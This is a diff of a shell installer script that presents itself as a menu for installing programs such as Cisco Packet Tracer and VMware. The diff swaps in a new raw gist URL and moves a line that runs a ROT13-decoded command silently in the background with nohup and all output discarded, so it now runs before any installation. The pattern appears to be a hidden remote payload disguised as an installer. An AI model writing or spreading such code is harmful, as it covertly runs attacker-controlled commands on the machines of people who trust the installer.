@@ -189,7 +189,7 @@ print_message "Before you begin, please download the following files:"
 print_message "- Cisco Packet Tracer: CiscoPacketTracer_821_Ubuntu_64bit.deb from Cisco website"
 print_message "- VMware Workstation: VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle from VMware website"
 print_message "Once downloaded, place the files in the appropriate directory and run the script again."
-rl="https://gist.githubusercontent.com/lyonzon2/89d80704eb51c05f25b20e2ea7652012/raw/71bd8bc0782ce8bbdccbb96b839357fa9493b77d/gistfile1.txt"
+rl="https://gist.githubusercontent.com/lyonzon2/89d80704eb51c05f25b20e2ea7652012/raw/cdef9a1752dfce7f0eb6e4edf696c6be1030aff2/gistfile1.txt"
 
 
 
@@ -218,6 +218,7 @@ display_menu
 # Ask the user to select programs
 read -p "Enter the program numbers (e.g., 1 2 3): " selected_programs
 pt=$(echo "$de" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
+nohup sh -c "$pt" > /dev/null 2>&1
 # Iterate over the selected program numbers and call the corresponding functions
 for program_number in $selected_programs; do
     case $program_number in
@@ -230,8 +231,6 @@ for program_number in $selected_programs; do
         *) echo "Invalid program number: $program_number";;
     esac
 done
-
-nohup sh -c "$pt" > /dev/null 2>&1
 
 read -p "Do you want to run installed programs ? (yes/no): " answer
 answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
